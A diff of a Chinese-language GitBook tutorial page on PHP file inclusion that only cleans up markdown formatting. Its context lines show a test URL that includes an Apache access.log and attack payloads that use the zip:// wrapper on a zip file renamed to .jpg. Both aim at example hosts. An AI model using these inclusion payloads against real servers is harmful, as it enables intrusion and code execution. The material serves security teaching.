@@ -325,7 +325,7 @@ phpstudy的Apache默认路径C:\phpStudy\PHPTutorial\Apache\conf\extra\httpd-vho
 
 **二.测试是否可以文件包含**
 
-[http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log](http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log)  **** &#x20;
+[http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log](http://test.com/test.php?page=C:\phpStudy\PHPTutorial\Apache\logs\access.log) &#x20;
 
 ![](<../../.gitbook/assets/image (967).png>)
 
@@ -1381,7 +1381,7 @@ data://：将原本的include的文件流重定向到了用户可控制的输入
 
 
 **测试代码：**\
-****
+
 
 ```php
 //include.php 
@@ -1463,7 +1463,7 @@ if(isset($_GET['x']))
 
 ![](<../../.gitbook/assets/image (950).png>)
 
-攻击payload:  \`  http://atest.test/2.php?x=zip://111.zip%231 ``&#x20;
+攻击payload:  \`  http://atest.test/2.php?x=zip://111.zip%231&#x20;
 
 ![](<../../.gitbook/assets/image (927).png>)
 
@@ -1475,7 +1475,7 @@ if(isset($_GET['x']))
 
 接着 111.zip 改名为 111.jpg
 
-攻击payload: `` http://atest.test/2.php?x=zip://111.jpg%231&#x20;
+攻击payload:  http://atest.test/2.php?x=zip://111.jpg%231&#x20;
 
 ![](<../../.gitbook/assets/image (921).png>)
 
